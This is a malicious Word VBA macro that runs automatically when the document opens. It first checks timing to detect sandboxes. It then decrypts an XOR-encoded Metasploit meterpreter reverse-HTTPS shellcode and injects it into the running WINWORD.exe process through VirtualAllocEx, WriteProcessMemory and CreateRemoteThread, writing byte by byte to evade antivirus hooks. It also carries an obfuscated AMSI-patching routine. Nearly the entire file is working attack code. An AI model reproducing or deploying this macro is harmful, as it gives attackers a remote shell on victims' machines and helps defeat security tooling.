Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function mymacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    Dim Is64 As Boolean
    Dim StrFile As String
    
    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If

    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "0xfa"

    'msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key '0xfa'
    sc = Array(252, 232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 49, 255, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 139, 82, 16, 87, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 80, 139, 88, 32, 1, 211, 133, 201, 116, 60, 49, 255, _
    73, 139, 52, 139, 1, 214, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
    104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 45, 203, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
    106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, _
    94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 240, 181, 162, 86, 106, 0, 83, 255, 213)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

    'grab handle to target, which has to be running if this macro is opened from word
    pid = getPID("WINWORD.exe")
    Handle = OpenProcess(&H1F0FFF, False, pid)
    
    'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    'byte-by-byte to attempt sneaking our shellcode past AV hooks
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function
Sub patch(StrFile As String, Is64 As Boolean)
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    lib = getmod(StrFile)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub
Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)
    For Each Process In objProcessSet
        getPID = Process.ProcessID
    Next
End Function
Sub test()
    mymacro
End Sub
Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub
